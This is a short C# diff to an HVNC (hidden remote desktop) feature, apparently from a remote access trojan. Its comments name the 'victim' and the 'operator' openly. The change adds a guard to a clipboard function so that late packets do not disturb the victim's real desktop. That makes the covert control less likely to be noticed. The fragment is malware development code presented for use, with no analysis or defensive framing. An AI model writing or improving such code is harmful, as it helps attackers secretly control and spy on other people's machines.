@@ -475,6 +475,11 @@ internal static class HvncFeature
 
     public static unsafe void SetClipboard(string text)
     {
+        // Guard: never touch victim's clipboard when HVNC is stopped.
+        // In-transit packets can arrive after Stop() zeroes _hDesktop;
+        // acting on them would corrupt the victim's real desktop clipboard.
+        if (_hDesktop == 0) return;
+
         // Clipboard is window-station-wide — no SetThreadDesktop needed.
         // Empty string = clear only: server sends this when sync is disabled so that
         // HVNC apps cannot read the operator's clipboard via right-click → Paste.
